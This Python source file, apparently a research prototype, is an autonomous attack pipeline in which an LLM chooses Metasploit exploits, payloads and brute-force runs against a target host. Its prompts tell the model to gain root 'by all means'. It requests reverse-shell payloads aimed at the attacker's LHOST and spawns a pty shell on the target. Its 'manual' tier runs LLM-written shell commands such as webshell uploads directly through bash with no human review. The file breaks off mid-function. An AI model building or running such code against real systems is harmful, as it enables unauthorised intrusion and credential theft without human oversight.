# -*- coding: utf-8 -*-
import time
import json
import re
import sys
import os
import datetime
import socket
import concurrent.futures
import argparse
import ipaddress

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

os.environ["ANONYMIZED_TELEMETRY"] = "False"

from src.metasploit_client import MetasploitClient
from src.llm_client import LLMClient
from src.rag_engine import RagEngine
from src.pipeline_common import PipelineBase, resolve_target
from src import recon, wordlists
from src.llm_metrics import METRICS

# --- COLORS ---
C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"

# --- CONFIG ---
LOOT_DIR = "/app/data/logs"
WORDLIST_PATH = "/app/data/credentials.txt"
API_KEY_PATH = "/app/config/api_key.txt"

os.makedirs(LOOT_DIR, exist_ok=True)

class PentestPipeline(PipelineBase):
    def __init__(self, target_ip, attacker_ip, use_rag=True, only_port=None):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.use_rag = use_rag
        self.only_port = str(only_port) if only_port else None
        
        print("=== INICIALIZANDO PIPELINE AUTONOMO (V17 - SINGLE TARGET DIRECT) ===")
        print(f"[*] Alvo Definido: {self.target_ip}") 
        print(f"[*] IP do Atacante (LHOST): {self.attacker_ip}")
        print(f"[*] Wordlist: {WORDLIST_PATH}")
        print(f"[*] Logs serao salvos em: {LOOT_DIR}")
        print(f"[*] Modo RAG: {'HABILITADO' if self.use_rag else 'DESATIVADO (LLM pura / baseline)'}")
        
        self.setup_api_key()
        
        try:
            self.msf = MetasploitClient(password="msfpass", server="192.168.70.20")
            with open(os.devnull, 'w') as fnull:
                old_stderr = sys.stderr
                sys.stderr = fnull
                try:
                    self.llm = LLMClient()
                    self.rag = RagEngine() if self.use_rag else None
                finally:
                    sys.stderr = old_stderr
        except Exception as e:
            print(f"[CRITICO] Falha ao iniciar componentes: {e}")
            sys.exit(1)
            
        self.history = []
        self.open_ports = {} 
        self.session_id = None
        self.manual_access = None  # TIER C: foothold manual (sem sessao MSF)
        self.found_creds = []  # creds obtidas (brute) p/ reuso e chaining
        self.evidence = {}
    
    def check_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.7) 
            if sock.connect_ex((self.target_ip, port)) == 0:
                sock.close()
                return port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            if sock.connect_ex((self.target_ip, port)) == 0:
                sock.close()
                return port
        except: pass
        return None

    def fast_python_scan(self):
        open_ports_found = []
        ports = list(range(1, 6000)) + list(range(20000, 30000))
        print(f"{C_YELLOW}[*] Escaneando {len(ports)} portas...{C_RESET}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {executor.submit(self.check_port, p): p for p in ports}
            for future in concurrent.futures.as_completed(future_to_port):
                p = future.result()
                if p: open_ports_found.append(str(p))
        return sorted(open_ports_found, key=int)

    def get_service_banner(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((self.target_ip, int(port)))
            try:
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    s.close()
                    return re.sub(r'[^\x20-\x7E]', '', banner)
            except socket.timeout: pass

            try:
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                s.close()
                clean = re.sub(r'[^\x20-\x7E]', '', banner)
                return clean if clean else "Unknown Service"
            except:
                s.close()
                return "No Banner"
        except: return "No Banner"

    # --- RELATORIO ---
    def generate_text_report(self):
        now = datetime.datetime.now()
        safe_ip = self.target_ip.replace(".", "_")
        filename = f"{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        filepath = os.path.join(LOOT_DIR, filename)
        
        lines = [
            "="*50, "RELATORIO FINAL", "="*50,
            f"DATA: {now}", f"STATUS: {'PWNED' if (self.session_id or self.manual_access) else 'FALHA'}", "-"*50,
            f"PORTAS: {list(self.open_ports.keys())}", "\n[HISTORICO]"
        ] + [f"- {h}" for h in self.history]
        
        if hasattr(self, 'evidence') and self.evidence.get("shell_info"):
             lines.append("\n[EVIDENCIAS]")
             lines.append(f"SHELL INFO: {self.evidence['shell_info']}")

        try:
            with open(filepath, "w") as f: f.write("\n".join(lines))
            print(f"\n{C_GREEN}{'='*60}")
            print(f" [LOG] RELATORIO SALVO: {filepath}")
            print(f"{'='*60}{C_RESET}\n")
        except Exception as e:
            print(f"{C_RED}[ERRO LOG] Nao foi possivel salvar relatorio: {e}{C_RESET}")

        # Registro por-run p/ estatisticas de pesquisa (telemetria + resultado).
        try:
            METRICS.write_run_record(
                status=("PWNED" if (self.session_id or self.manual_access) else "FALHA"),
                target=self.target_ip,
                attacker=getattr(self, "attacker_ip", None),
                rag_enabled=getattr(self, "use_rag", True),
            )
        except Exception:
            pass

    def enter_interactive_mode(self):
        if not self.session_id: return
        print(f"\n{C_MAGENTA}=== MODO INTERATIVO (SESSAO {self.session_id}) ==={C_RESET}")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"])
            time.sleep(1)
            self.msf.client.call('session.shell_read', [self.session_id])
        except: pass

        while True:
            try:
                cmd = input(f"{C_BOLD}{C_BLUE}Shell@{self.target_ip} > {C_RESET}")
                if cmd.lower() in ['exit', 'quit']:
                    print(f"{C_YELLOW}[*] Encerrando interacao.{C_RESET}")
                    break
                if not cmd.strip(): continue
                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
                time.sleep(1.5)
                res = self.msf.client.call('session.shell_read', [self.session_id])
                if res and res.get('data'): print(f"{C_GREEN}{res['data'].strip()}{C_RESET}")
            except: break

    def _is_web(self, port, banner):
        """A porta serve HTTP(S)? Decidido pela DETECCAO DE SERVICO do nmap (-sV),
        nao por uma lista de portas hardcoded: o recon rotula http/https/
        http-proxy/http-alt/ssl|http etc. Assim nenhuma porta recebe tratamento
        especial - vale o que o reconhecimento identificou no alvo."""
        try:
            svc = (self.services.get(port, {}).get("service", "") or "").lower()
        except Exception:
            svc = ""
        b = (banner or "").lower()
        return ("http" in svc or "www" in svc or "http" in b)

    def web_enumerate(self, port):
        """RECON WEB: quando a porta e HTTP(S), descobre caminhos/apps (http-enum),
        titulo, headers e metodos via nmap NSE, para o LLM escolher um exploit web
        REAL e preencher TARGETURI. So COLETA informacao (nao decide o ataque)."""
        import subprocess
        scripts = "http-enum,http-title,http-headers,http-methods,http-robots.txt"
        cmd = ["nmap", "-Pn", "-T4", "-p", str(port), "--script", scripts,
               "--host-timeout", "100s", "-oN", "-", self.target_ip]
        try:
            out = subprocess.run(cmd, capture_output=True, text=True,
                                 timeout=140).stdout
        except Exception as e:
            return f"(enumeracao web indisponivel: {e})"
        keep = []
        for ln in out.splitlines():
            t = ln.strip()
            if t.startswith("|") or "/tcp" in t or "http-" in t:
                keep.append(t)
        text = "\n".join(keep).strip()
        if not text:
            return "(nenhum caminho/app relevante descoberto na enumeracao web)"
        if len(text) > 1800:
            text = text[:1800] + "\n...(truncado)"
        return text

    def web_app_cards(self, web_context):
        """Para cada app/path descoberto na enum web, faz uma query FOCADA no RAG
        e junta os cards-receita especificos, garantindo que cheguem ao prompt
        (a query misturada por banner afunda as receitas de app)."""
        if not self.use_rag or not self.rag:
            return ""
        apps = []
        for ln in web_context.splitlines():
            t = ln.strip().lstrip("|_ ").strip()
            m = re.match(r"^(/\S*):\s*(.+)$", t)
            if m:
                label = m.group(2).strip()
                low = label.lower()
                generic = any(w in low for w in ("potentially interesting",
                              "directory", "folder", "listing", "test page",
                              "information file", "icons", "index"))
                if generic:
                    continue   # path-ruido: nao vira termo de busca
                if label and label not in apps:
                    apps.append(label)
            elif "dav" in t.lower() and "server" in t.lower():
                if "webdav upload" not in apps:
                    apps.append("webdav upload")
            elif "x-powered-by" in t.lower() and "php" in t.lower():
                if "php cgi argument injection" not in apps:
                    apps.append("php cgi argument injection")
        if not apps:
            return ""
        seen, blocks = set(), []
        for app in apps[:6]:
            try:
                docs = self.rag.query(
                    f"attack recipe for {app} web application metasploit module "
                    f"targeturi payload", k=4)
            except Exception:
                continue
            tactic = [d for d in docs if "manual/tactic/" in d.page_content]
            other = [d for d in docs if "manual/tactic/" not in d.page_content]
            for d in (tactic[:1] + other[:1]):
                name = next((l.strip() for l in d.page_content.splitlines()
                             if l.strip().startswith("NAME:")), "")
                if name and name not in seen:
                    seen.add(name)
                    blocks.append(d.page_content)
        if not blocks:
            return ""
        return ("--- RECIPES FOR DISCOVERED WEB APPS (PRIORITIZE THESE over "
                "generic enumeration) ---\n\n" + "\n\n".join(blocks))

    def run_manual_exploit(self, port, banner, web_context="", rag_context="",
                           max_rounds=4):
        """TIER C: exploracao MANUAL autonoma (fora do Metasploit). O LLM AUTORA
        comandos de shell (curl/python3/perl/wget) executados NO ATACANTE (este
        host); a saida real volta ao LLM ate confirmar execucao de codigo no
        alvo. Request/response (sem reverse shell): ideal p/ webshell e PoC HTTP.
        Retorna True se confirmou execucao (success_check presente na saida)."""
        import subprocess
        tools = "curl, python3, perl, wget, bash (NO nc, NO searchsploit)"
        history = []
        print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO (MANUAL / TIER C){C_RESET}")
        for rnd in range(1, max_rounds + 1):
            hist_txt = "\n".join(f"$ {c}\n{o[:600]}" for c, o in history[-4:]) \
                or "(no commands run yet)"
            prompt = f"""
YOU ARE A PENTESTER doing MANUAL exploitation in a CONTROLLED LAB because no
Metasploit module fits (recent CVE, or an eval-only module blocked by badchars).
Target {self.target_ip}:{port}. You run commands on the ATTACKER host
({self.attacker_ip}). SERVICE BANNER: "{banner}"

WEB ENUMERATION (discovered paths/apps):
{web_context}

KNOWLEDGE BASE (RAG):
{rag_context}

TOOLS on the attacker shell: {tools}. Prefer REQUEST/RESPONSE code execution
(e.g. upload a webshell via WebDAV PUT, then GET it with a command) over reverse
shells (there is NO nc here). Target each command at {self.target_ip}.

COMMANDS ALREADY RUN AND THEIR OUTPUT:
{hist_txt}

Return JSON ONLY:
{{
  "commands": ["shell command 1", "shell command 2"],
  "success_check": "substring proving code execution ON THE TARGET (e.g. uid=)",
  "done": false,
  "reason": "what you are trying and why"
}}
If the output above already proves execution on the target, set done=true.
"""
            resp = self.ask_llm_robust(prompt)
            if not resp:
                print(f"{C_RED}[MANUAL] LLM sem resposta.{C_RESET}")
                return False
            try:
                if "{" in resp:
                    resp = resp[resp.find("{"):resp.rfind("}") + 1]
                plan = json.loads(resp)
            except Exception:
                print(f"{C_RED}[MANUAL] JSON invalido do LLM.{C_RESET}")
                return False
            check = (plan.get("success_check") or "").strip()
            print(f"{C_BLUE}[MANUAL] {plan.get('reason', '(sem motivo)')}{C_RESET}")
            cmds = plan.get("commands") or []
            if plan.get("done") and not cmds:
                break
            for cmd in cmds:
                print(f"{C_YELLOW}[MANUAL] $ {cmd}{C_RESET}")
                try:
                    r = subprocess.run(["bash", "-c", cmd], capture_output=True,
                                       text=True, timeout=30)
                    output = (r.stdout or "") + (r.stderr or "")
                except Exception as e:
                    output = f"[erro ao executar: {e}]"
                output = output[:2000]
                print(f"{C_CYAN}{output}{C_RESET}")
                history.append((cmd, output))
                if check and check in output:
                    print(f"{C_GREEN}[***] SUCESSO MANUAL! '{check}' presente na saida.{C_RESET}")
                    self.manual_access = {"port": port, "command": cmd,
                                          "output": output}
                    self.evidence["manual_shell"] = output
                    self.history.append(f"[SUCESSO MANUAL] Porta {port}: {cmd}")
                    return True
        print(f"{C_RED}[MANUAL] Esgotadas as rodadas sem confirmar execucao.{C_RESET}")
        return False

    def run(self):
        self.cleanup_sessions()
        print(f"\n>>> [FASE 1] RECONHECIMENTO")
        rec = recon.scan(self.target_ip)
        self.os_hint = rec.get("os", "") or "unknown"
        self.services = rec.get("ports", {})
        if self.only_port:
            self.services = {pp: ii for pp, ii in self.services.items() if str(pp) == self.only_port}
        print(f"    [*] Metodo de scan: {rec.get('method')}")
        print(f"    [*] OS detectado (recon): {self.os_hint}")
        if not self.services:
            print(f"{C_RED}[!] Nenhuma porta aberta encontrada.{C_RESET}")
            return
        self.open_ports = {}
        for p, info in sorted(self.services.items(), key=lambda x: int(x[0])):
            self.open_ports[p] = info.get("banner", "")
            print(f"    {C_GREEN}[+] Porta {p}: {info.get('banner','')}{C_RESET}")

        modo_fase2 = "100% RAG DRIVEN" if self.use_rag else "LLM ONLY - SEM RAG (baseline)"
        print(f"\n>>> [FASE 2] ANALISE DINAMICA ({modo_fase2})")
        wordlist_creds = self.load_credentials()

        # Fila de ataque: em falha, a porta volta p/ a fila para o LLM escolher
        # uma ESTRATEGIA alternativa (fallback guiado pelo modelo, nao hardcoded).
        attack_queue = [(pp, bb, "", []) for pp, bb in self.open_ports.items()]
        MAX_STRATS = 3  # tentativas de estrategia por porta
        while attack_queue:
            port, banner, fail_note, tried = attack_queue.pop(0)
            _prev_note = ""
            creds_block = ""
            if self.found_creds:
                _cl = [f"{c['user']}:{c['pass']} (port {c['port']} {c['service']})" for c in self.found_creds[:8]]
                creds_block = "AVAILABLE CREDENTIALS (already obtained; REUSE across services and for authenticated modules): " + "; ".join(_cl)
            if tried:
                _prev_note = (
                    "\n            PREVIOUS ATTEMPTS ON THIS PORT (already tried: "
                    + ", ".join(tried) + f"; last result: {fail_note}). "
                    "Choose a DIFFERENT strategy for THIS port now (if brute_force "
                    "failed, try exploit_cve; if exploit failed, try brute_force or "
                    "manual), or 'skip' if nothing else is viable.\n")
            print(f"\n{C_CYAN}--- ALVO: PORTA {port} ({banner}) ---{C_RESET}")

            # RECON WEB primeiro: os achados enriquecem a QUERY do RAG e o prompt.
            web_context = "(nao e um servico web)"
            web_sig = ""
            if self._is_web(port, banner):
                print(f"\n{C_CYAN}--- [RECON WEB] enumerando porta {port} (nmap http NSE)... ---{C_RESET}")
                web_context = self.web_enumerate(port)
                print(f"{C_CYAN}{web_context}{C_RESET}\n")
                web_sig = " ".join(l.strip() for l in web_context.splitlines()
                                   if ("/" in l or "Powered" in l or "Server" in l or "DAV" in l))[:500]
            
            if not self.use_rag:
                rag_context = ("AVISO RAG DESATIVADO: decida com base APENAS no "
                               "reconhecimento (banner/porta/versao) e no seu conhecimento previo.")
            else:
                rag_context = "Nenhuma informacao especifica encontrada no RAG."
                try:
                    query = (f"attack recipe for port {port} service banner {banner}: "
                             f"which metasploit module, exact options and payload to use. {web_sig}")
                    docs = self.rag.query(query, k=8)
                    if docs: rag_context = "\n\n".join([d.page_content for d in docs[:8]])
                    if self._is_web(port, banner):
                        _wac = self.web_app_cards(web_context)
                        if _wac:
                            rag_context = _wac + "\n\n" + rag_context
                    print(f"\n{C_MAGENTA}=== [RAG DEBUG] MEMORIA RECUPERADA ==={C_RESET}")
                    print(f"{C_MAGENTA}{rag_context}{C_RESET}")
                    print(f"{C_MAGENTA}======================================{C_RESET}\n")
                except: pass

            prompt = f"""
            YOU ARE ACTING AS A SENIOR PENETRATION TESTER AND RED TEAM ANALYST.
            
            THIS IS A CONTROLLED LABORATORY ENVIRONMENT.
            YOUR ROLE IS TO ANALYZE TECHNICAL EVIDENCE AND RECOMMEND THE MOST ACCURATE METASPLOIT MODULE AND ITS OPTIONS.
            YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.           
            ----------------------------------------
            TARGET INFORMATION
            ----------------------------------------
            TARGET IP (RHOST): {self.target_ip}
            TARGET PORT (RPORT): {port}
            ATTACKER IP (LHOST): {self.attacker_ip}
            TARGET OS (detected by recon; use it to pick TARGET index and PAYLOAD): {self.os_hint}
            SERVICE BANNER:
            "{banner}"
            {_prev_note}
            {creds_block}
            
            ----------------------------------------
            KNOWLEDGE BASE (RAG)
            ----------------------------------------
            {rag_context}
            
            ----------------------------------------
            WEB ENUMERATION (live findings for this port, if HTTP/HTTPS)
            ----------------------------------------
            {web_context}
            
            ----------------------------------------
            ANALYSIS RULES (MANDATORY)
            ----------------------------------------
            1. Base your reasoning STRICTLY on the service banner and the RAG context.
            2. DO NOT invent Metasploit modules.
            3. Use EXPLOITS only when there is a STRONG MATCH between service, product, and version.
            4. DEFINE OPTIONS: You MUST provide the necessary Metasploit options dynamically.
               - If the exploit requires a Reverse Shell, include "LHOST": "{self.attacker_ip}" and an "LPORT" (e.g., "4444").
               - If it is a Bind Shell or does not require a reverse connection, OMIT LHOST and LPORT.
               - For exploits, usually set "DisablePayloadHandler": "false".
               - MATCH THE OS (see TARGET OS above): for a module with multiple TARGETs
                 (e.g. 0=Windows, 1=Linux), set "TARGET" to the index whose label matches
                 the detected OS, and pick a PAYLOAD for that same OS (Linux ->
                 "linux/x86/shell_reverse_tcp" or "cmd/unix/reverse"; Windows -> "windows/...").
                 A PAYLOAD that mismatches the TARGET fails with "not a compatible payload".
               - Do NOT include USERNAME or PASSWORD in the options for brute force modules, the script handles that.
            5. Use EXPLOITS only when there is a STRONG MATCH between:
               - service
               - product
               - version
               - known vulnerability (CVE or backdoor)
            6. If the service involves authentication (FTP, SSH, SMB, DB):
               - Prefer login or authentication scanners before exploits and try brute force if viable.
            7. If uncertainty exists:
               - Choose a SAFE ENUMERATION strategy.
            8. For HTTP/HTTPS services: a server banner (Apache/nginx/PHP) does NOT
               identify the vulnerable app. Read the WEB ENUMERATION findings above.
               IF a known-vulnerable app/path was DISCOVERED (e.g. /phpMyAdmin/,
               /tikiwiki/, /twiki/, Drupal, WordPress, Jenkins, Struts, WebDAV, or
               "X-Powered-By: PHP/5.x") and the KNOWLEDGE BASE has a recipe for it,
               you MUST choose strategy "exploit_cve" with THAT module and set the
               exact path in "TARGETURI" (e.g. "TARGETURI": "/tikiwiki/"). Do NOT
               fall back to a version scanner (http_version) when an exploitable app
               was found. Choose enumeration (dir_scanner) ONLY if the WEB
               ENUMERATION discovered nothing exploitable.
               
            ----------------------------------------
            TASK
            ----------------------------------------
            1. Identify the most likely SERVICE and PRODUCT based on the banner.
            2. Decide the SAFEST and MOST EFFECTIVE NEXT STEP.
            3. Recommend ONE Metasploit module that best fits the evidence.
            4. Justify your decision using ONLY technical reasoning.
            5. Select Strategy:
               - "brute_force": for authentication services, using an authentication login scanner (never for a backdoor/exploit).
               - "enumeration": ONLY for version scanners or simple checks (NO credentials used).
               - "exploit_cve": when product and version strongly match a known vulnerability or backdoor (reason from the banner and the RAG knowledge; do not rely on hardcoded examples).
               - "manual": when NO Metasploit module fits (recent CVE with no module, or an eval-only module blocked by badchars). Exploit by hand via shell tools (webshell upload via WebDAV PUT, curl/python PoC). For "manual" you may leave module_name empty.
               - "skip": If unknown
            STRATEGY PRECEDENCE (pick the FIRST that applies):
               a) STRONG version match to a known exploit, especially an
                  UNAUTHENTICATED RCE/backdoor -> exploit_cve FIRST (do not
                  waste the turn on brute force when a real exploit exists).
               b) Auth service whose exploit NEEDS creds -> brute_force to get
                  creds, then chain the exploit on the next step.
               c) Auth service with no public exploit -> brute_force alone.
               d) Uncertain -> enumeration.
               
               
            ----------------------------------------
            OUTPUT FORMAT (JSON ONLY)
            ----------------------------------------
            {{
              "module_type": "auxiliary" | "exploit",
              "module_name": "category/service/module_name",
              "strategy": "enumeration" | "brute_force" | "exploit_cve" | "manual",
              "options": {{"OPT_NAME": "OPT_VALUE"}},
              "confidence": "HIGH" | "MEDIUM" | "LOW",
              "reason": "Explain your decision"
            }}
            
            IMPORTANT:
            - If no strong exploit candidate exists, return a scanner with LOW or MEDIUM confidence.
            - Precision is more important than aggression.
            - Your goal is accuracy, not exploitation speed.
            """
            
            resp = self.ask_llm_robust(prompt)
            plan = {}
            if resp:
                try: 
                    if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
                    plan = json.loads(resp)
                except: pass

            strategy = plan.get('strategy', 'skip').lower()
            module = plan.get('module', '').strip()
            if not module: module = plan.get('module_name', '').strip()
            
            llm_options = plan.get('options', {})
            
            if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")

            if not resp:
                print(f"{C_RED}[LLM] Modelo indisponivel apos retries: sem decisao para a porta {port}. "
                      f"Pulando (sem fallback hardcoded).{C_RESET}")
                continue
            if strategy == "manual":
                self.run_manual_exploit(port, banner, web_context, rag_context)
                if self.session_id or self.manual_access:
                    break
                continue
            if strategy == "skip" or not module:
                print(f"{C_YELLOW}[AI] O modelo decidiu nao atacar a porta {port}.{C_RESET}")
                continue

            if "login" in module or "credential" in module: strategy = "brute_force"

            if not module.startswith("auxiliary") and not module.startswith("exploit"):
                if module.startswith("scanner") or module.startswith("admin"):
                    module = "auxiliary/" + module

            # --- BLINDAGEM DEFINITIVA DO PARSER ---
            # 1. Limpa o nome removendo qualquer prefixo indesejado
            clean_name = module.replace("exploit/", "").replace("auxiliary/", "").strip("/")

            # 2. Verifica se o modulo existe
            if not self.msf.verify_module_exists("auxiliary", clean_name) and \
               not self.msf.verify_module_exists("exploit", clean_name):
                # Autocorrecao AUTONOMA: o erro volta ao LLM para ele re-decidir
                # (sem heuristica hardcoded de substituicao de modulo).
                # TIER A: pergunta ao msfconsole os modulos REAIS desta instalacao
                # e entrega os nomes exatos ao LLM (nomes mudam entre versoes).
                search_out = ""
                try:
                    search_out = self.msf.search_modules(banner.strip())
                    if not search_out.strip():
                        search_out = self.msf.search_modules(module.split("/")[-1])
                except Exception:
                    pass
                if search_out.strip():
                    print(f"{C_MAGENTA}=== [SEARCH] modulos reais encontrados ==={C_RESET}")
                    print(f"{C_MAGENTA}{search_out}{C_RESET}")
                fix_prompt = (f"O modulo Metasploit '{module}' nao existe nesta instalacao.\n"
                              f"Servico/banner: {banner}\n"
                              f"RESULTADOS REAIS do comando search nesta instalacao "
                              f"(escolha UM destes nomes EXATOS, se algum servir):\n"
                              f"{search_out or '(search sem resultados)'}\n"
                              f"Contexto (RAG):\n{rag_context}\n"
                              f"Responda SOMENTE JSON com um modulo Metasploit REAL e valido: "
                              f'{{"module_type":"auxiliary|exploit","module_name":"cat/serv/mod","strategy":"enumeration|brute_force|exploit_cve"}}')
                fresp = self.ask_llm_robust(fix_prompt)
                fixed = ""
                if fresp:
                    try:
                        if "{" in fresp: fresp = fresp[fresp.find("{"):fresp.rfind("}")+1]
                        fp = json.loads(fresp)
                        fixed = (fp.get("module_name") or "").strip()
                        if fp.get("strategy"): strategy = fp["strategy"].lower()
                    except Exception: pass
                if fixed:
                    module = fixed
                    clean_name = fixed.replace("exploit/", "").replace("auxiliary/", "").strip("/")
                if not (self.msf.verify_module_exists("auxiliary", clean_name) or
                        self.msf.verify_module_exists("exploit", clean_name)):
                    print(f"{C_RED}[ERRO] Modulo invalido e o LLM nao forneceu alternativa valida. Pulando.{C_RESET}")
                    continue

            # 3. Define o tipo cravado baseado na estrategia da IA
            if strategy == "exploit_cve":
                m_type = "exploit"
            else:
                m_type = "auxiliary"
                
            m_name = clean_name

            opts = {"RHOSTS": self.target_ip, "RPORT": int(port)}
            opts.update(llm_options) 
            
            if strategy in ("exploit_cve", "enumeration"):
                self._inject_creds(m_type, m_name, opts, port)
            if strategy != "skip":
                print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
            
            if strategy == "brute_force":
                wl = wordlists.resolve()
                if not (wl["userpass_file"] or wl["pass_file"]):
                    print(f"{C_YELLOW}[SKIP] Sem wordlist disponivel.{C_RESET}")
                    continue
                print(f"{C_YELLOW}[*] Brute force (arquivo) em {m_name} | {wl['stats']}{C_RESET}")
                before_sid = self._max_sid()
                out = self.msf.run_login_scanner(m_name, opts,
                                                 userpass_file=wl["userpass_file"],
                                                 user_file=wl["user_file"],
                                                 pass_file=wl["pass_file"]) or ""
                creds = re.findall(r"(?:Success|Login Successful|succeeded)[^\n]*", out)
                for _cl in creds:
                    _m = re.search(r"'([^':]+):([^']*)'", _cl)
                    if _m: self._add_cred(port, banner, _m.group(1), _m.group(2))
                sid = self._max_sid()
                if sid and sid != before_sid:
                    self.session_id = sid
                    self.history.append(f"[SUCESSO] Porta {port} via {m_name} (sessao {sid})")
                    print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} via {m_name}.{C_RESET}")
                elif creds:
                    self.history.append(f"[CRED] Porta {port} via {m_name}: {creds[:3]}")
                    print(f"\n{C_GREEN}[+] Credenciais validas: {creds[:3]}{C_RESET}")
                else:
                    print(f"\n{C_RED}[FALHA] Nenhuma credencial valida na wordlist.{C_RESET}")

            elif strategy == "enumeration":
                print(f"{C_YELLOW}[*] Executando Scanner (Run Once)...{C_RESET}")
                try:
                    self.msf.run_module(m_type, m_name, opts)
                    time.sleep(4)
                    print(f"{C_GREEN}[INFO] Scanner finalizado.{C_RESET}")
                except Exception as e: print(f"{C_RED}[ERRO] {e}{C_RESET}")

            # --- DEBUG DETALHADO DO EXPLOIT COM AUTO-RETRY ---
            elif strategy == "exploit_cve":
                print(f"{C_YELLOW}[*] Iniciando cadeia de Exploit (com Auto-Retry AI)...{C_RESET}")
                
                max_attempts = 3
                tried_payloads = set()
                for attempt in range(1, max_attempts + 1):
                    opts["DisablePayloadHandler"] = opts.get("DisablePayloadHandler", "false")
                    if opts.get("PAYLOAD"):
                        tried_payloads.add(opts["PAYLOAD"])
                    
                    print(f"\n{C_YELLOW}[DEBUG] Tentativa {attempt}/{max_attempts} - Executando {m_type}/{m_name}{C_RESET}")
                    print(f"{C_YELLOW}[DEBUG] Opcoes injetadas pela IA: {opts}{C_RESET}")
                    
                    mod_output = self.msf.run_module(m_type, m_name, opts) or ""
                    if mod_output.strip():
                        print(f"{C_YELLOW}[MSF OUTPUT]\n{mod_output}{C_RESET}")
                    print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando 20s...{C_RESET}")
                    time.sleep(20) 
                    
                    sessions = self.msf.client.call('session.list') or {}
                    if sessions:
                        sid = str(max([int(k) for k in sessions.keys()]))
                        if sid != self.session_id:
                            print(f"{C_GREEN}[***] SUCESSO ABSOLUTO! Exploit funcionou (Sessao {sid}){C_RESET}")
                            self.session_id = sid
                            self.history.append(f"[SUCESSO] Porta {port} via {m_type}/{m_name} (sessao {sid})")
                            break # SESSAO OBTIDA
                    
                    print(f"{C_RED}[FALHA] Nenhuma sessao obtida na tentativa {attempt}.{C_RESET}")
                    
                    # SE FALHOU, PEDE CORREÇÃO DO ERRO
                    if attempt < max_attempts:
                        print(f"{C_YELLOW}[*] Consultando a IA Estrategista para recalcular os parametros...{C_RESET}")
                        _enc_wall = "encoders failed to encode" in (mod_output or "").lower()
                        _tried_txt = ", ".join(sorted(tried_payloads)) or "(none)"
                        _wall_note = ""
                        if _enc_wall:
                            _wall_note = (
                                "ENCODER WALL: 'All encoders failed to encode' is a BadChars "
                                "incompatibility, NOT a transient error. ANOTHER php/* payload "
                                "will FAIL IDENTICALLY. You MUST do ONE of: (a) use a cmd/unix/* "
                                "or generic/* payload this module accepts; (b) switch module via "
                                "'module_name' to a DIFFERENT exploit for this app (e.g. an "
                                "upload-based one that writes a .php webshell). Do NOT pick "
                                "another php/* payload.\n")
                        retry_prompt = f"""
                        The exploit '{m_name}' failed to create a session on {self.target_ip}.
                        The options used were: {opts}
                        {_wall_note}
                        Payloads already tried (do NOT repeat any of these): {_tried_txt}
                        
                        REAL METASPLOIT OUTPUT (read it and fix the ACTUAL error):
                        ---
                        {mod_output[-1500:] if mod_output else "(no output captured)"}
                        ---
                        
                        Fix the problem shown above. Common fixes:
                        - "Unknown datastore option: X. Did you mean Y?" -> put X in
                          "remove_options" and set the correct option Y in "options".
                        - "All encoders failed to encode" / payload errors -> change PAYLOAD
                          (old PHP webapps: try "php/reverse_php" or "generic/shell_reverse_tcp";
                          cmd targets: "cmd/unix/reverse").
                        - "No target"/"Invalid target"/"Invalid payload for given target" ->
                          change TARGET index or align PAYLOAD with TARGET.
                        - "not vulnerable"/"does not appear" -> path/version wrong; fix
                          URI/TARGETURI/RPORT.
                        Use the EXACT option names this module accepts. Do NOT give up early.
                        If the SAME module cannot work (e.g. "All encoders failed to encode"
                        keeps happening because its BadChars are incompatible with every
                        payload, or it reports "not vulnerable"), you MAY switch to a
                        DIFFERENT real module for the same service/app via "module_name".
                        
                        OUTPUT FORMAT (JSON ONLY):
                        {{
                          "strategy": "exploit_cve",
                          "module_name": "optional/replacement/module (omit to keep current)",
                          "options": {{"OPT_NAME": "NEW_OPT_VALUE"}},
                          "remove_options": ["OPT_TO_REMOVE"],
                          "reason": "Explain exactly what you changed and why (cite the output)."
                        }}
                        """
                        resp = self.ask_llm_robust(retry_prompt)
                        if resp:
                            try:
                                if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
                                new_plan = json.loads(resp)
                                
                                if False:  # aborto precoce desabilitado: esgota todas as tentativas
                                    print(f"{C_RED}[AI] Decidiu abortar as tentativas: {new_plan.get('reason')}{C_RESET}")
                                    break
                                
                                # ATUALIZA COM NOVA SUGESTÃO
                                nm = (new_plan.get("module_name") or "").strip()
                                if nm:
                                    cn = nm.replace("exploit/", "").replace("auxiliary/", "").strip("/")
                                    if self.msf.verify_module_exists("exploit", cn):
                                        m_type, m_name = "exploit", cn
                                        print(f"{C_BLUE}[AI] Trocando de modulo para: exploit/{m_name}{C_RESET}")
                                    else:
                                        print(f"{C_RED}[AI] Modulo sugerido invalido: {nm} (mantendo o atual){C_RESET}")
                                for _rk in (new_plan.get("remove_options") or []):
                                    opts.pop(_rk, None)
                                new_opts = new_plan.get("options", {})
                                opts.update(new_opts) 
